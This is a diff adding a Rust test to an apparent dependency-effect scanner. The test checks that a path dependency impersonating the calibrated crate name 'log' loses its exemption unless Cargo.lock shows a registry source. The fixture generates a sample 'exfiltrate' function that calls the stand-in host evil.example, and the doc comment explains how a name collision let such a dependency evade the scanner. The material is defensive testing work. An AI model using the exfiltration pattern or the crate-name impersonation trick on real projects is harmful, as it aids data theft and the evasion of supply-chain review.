@@ -7533,6 +7533,93 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             "the unclassified read() must still be disclosed even with a classified sibling call:\n{mixed:#}");
     }
 
+    /// BACKLOG "rust-deep's crate-name-keyed `invisible` mechanism, everywhere else" — the COLLISION
+    /// direction: "a workspace crate sharing a name with a `CALIBRATED_CRATES` member inherits [the]
+    /// exemption for its own unclassified calls". `CALIBRATED_CRATES`/`PATH_CALIBRATED_CRATES`/
+    /// `CALIBRATED_PREFIXES` are STRING matches against `cr` (the call's syntactic first path segment) —
+    /// they carry no check that the crate wearing that name is the actual, reviewed, published artifact
+    /// `classify()`'s rules were written against. A `path` dependency can be named anything, including
+    /// one of the 82 `CALIBRATED_CRATES` entries (`log` here — a plausible accidental collision, not an
+    /// exotic one: an internal logging shim/vendored fork keeping the upstream name is an ordinary
+    /// shape). Before the fix this reproduced EXACTLY like R59/R60: `"functions": []`, total silence —
+    /// worse than an uncalibrated dependency, which discloses `invisible` on the identical call shape
+    /// (proved live against the pre-fix binary: standalone `candor-scan` on a `victim` crate path-
+    /// depending on a crate literally named `log` that performs `std::net::TcpStream::connect` under an
+    /// unmodelled tail name printed `"functions": []`; the same fixture with the dependency renamed to
+    /// `logimpostor` — the ONLY variable changed — correctly disclosed `invisible: ["logimpostor"]`,
+    /// isolating the cause to the name collision alone, not the call shape).
+    ///
+    /// THE FIX: `non_registry_lock_names` reads `dir`'s Cargo.lock and strips all three CALIBRATED_*
+    /// exemptions for any name Cargo.lock CONFIRMS is not registry-sourced (a `path`/`git` dependency, or
+    /// a workspace-local package — no `source = "registry+…"` line). A DENYLIST narrowing: the exemption
+    /// behaves exactly as before unless there is POSITIVE evidence the name is an impostor.
+    ///
+    /// CONTROLS, isolating exactly one variable each: (a) the SAME name as a genuine registry dependency
+    /// (Cargo.lock says `registry+…`) keeps the exemption — the common, correct case must not regress;
+    /// (b) no Cargo.lock present at all (most fixtures, and any scan run before `cargo generate-lockfile`)
+    /// falls back to the PRE-FIX behavior unchanged — this is a stated, tested residual limit, not an
+    /// oversight: the fix only fires when Cargo.lock gives it something to check.
+    #[test]
+    fn crate_name_collision_with_a_calibrated_crate_loses_the_ledger_exemption() {
+        let build = |name: &str, lock_source: Option<&str>| -> serde_json::Value {
+            let d = std::env::temp_dir().join(format!("candor-collide-{name}-{}", std::process::id()));
+            let _ = std::fs::remove_dir_all(&d);
+            std::fs::create_dir_all(d.join("src")).unwrap();
+            std::fs::write(d.join("Cargo.toml"), format!(
+                "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n[dependencies]\n{name} = {{ path = \"../{name}fake\" }}\n"
+            )).unwrap();
+            if let Some(source_line) = lock_source {
+                std::fs::write(d.join("Cargo.lock"), format!(
+                    "version = 3\n\n[[package]]\nname = \"victim\"\nversion = \"0.1.0\"\ndependencies = [\n \"{name}\",\n]\n\n[[package]]\nname = \"{name}\"\nversion = \"0.1.0\"\n{source_line}\n"
+                )).unwrap();
+            }
+            std::fs::write(d.join("src/lib.rs"), format!(
+                "pub fn exfiltrate() {{ {name}::totally_unmodelled_tail(\"http://evil.example\"); }}\n"
+            )).unwrap();
+            let idx = DepIndex::default();
+            let (rc, body) = scan_one(&d.to_string_lossy(), ScanOpts {
+                prefix: String::new(), want_json: true, include_tests: false, policy: None,
+                baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
+            }, &crate::gate::begin_run());
+            assert_eq!(rc, 0, "scan should succeed:\n{body:?}");
+            let v = serde_json::from_str(&body.unwrap()).unwrap();
+            let _ = std::fs::remove_dir_all(&d);
+            v
+        };
+        // THE FIX: a `path` dependency named `log` (CALIBRATED_CRATES), Cargo.lock confirming it is NOT
+        // registry-sourced, must lose the exemption and disclose like any uncalibrated dependency.
+        let impostor = build("log", Some(""));
+        assert!(
+            !impostor["functions"].as_array().unwrap().is_empty(),
+            "before the fix a path dep merely NAMED `log` vanished entirely (\"functions\": []) — the \
+             identical silent drop as R59/R60, via a name collision instead of an FFI seam:\n{impostor:#}"
+        );
+        assert_eq!(fn_entry(&impostor, "exfiltrate")["invisible"], serde_json::json!(["log"]),
+            "an unclassified call into a NON-registry `log` must disclose the crate as invisible:\n{impostor:#}");
+        assert!(effs(fn_entry(&impostor, "exfiltrate")).is_empty(),
+            "NO FABRICATION: the impostor's real effect (Net) is unknown to classify() by construction \
+             here — it must never be guessed:\n{impostor:#}");
+        assert_eq!(impostor["coverage"]["uncovered"], serde_json::json!([{ "name": "log", "calls": 1 }]),
+            "the coverage ledger must count the unclassified call into the impostor:\n{impostor:#}");
+        // CONTROL (a) — OVER-CHARGE GUARD: the SAME name, Cargo.lock confirming a real registry source,
+        // must keep the exemption exactly as before — the common, correct case is untouched.
+        let registry = build("log", Some(r#"source = "registry+https://github.com/rust-lang/crates.io-index""#));
+        assert!(
+            registry["functions"].as_array().unwrap().is_empty(),
+            "a registry-sourced `log` must keep the CALIBRATED_CRATES exemption unchanged — this fix \
+             must never over-charge the ordinary case:\n{registry:#}"
+        );
+        // CONTROL (b) — STATED RESIDUAL: with no Cargo.lock at all, there is nothing to check the name
+        // against, so the fix cannot fire — behavior is IDENTICAL to before the fix. Documented, not
+        // silently assumed: a scan run before `cargo generate-lockfile` gets no protection from this fix.
+        let no_lockfile = build("log", None);
+        assert!(
+            no_lockfile["functions"].as_array().unwrap().is_empty(),
+            "with no Cargo.lock to check, the pre-fix (permissive) behavior must be UNCHANGED — this is \
+             the fix's stated boundary, not a regression:\n{no_lockfile:#}"
+        );
+    }
+
     /// R59-CLASS PROBE (the ~79-crate audit `3cb1906`'s own commit message named as still open):
     /// `clap::Arg::env(name)` calls `env::var_os(&name)` DIRECTLY at builder time (clap_builder
     /// 4.6.6, builder/arg.rs:2205-2213) — a real `Env` read, independent of and long before
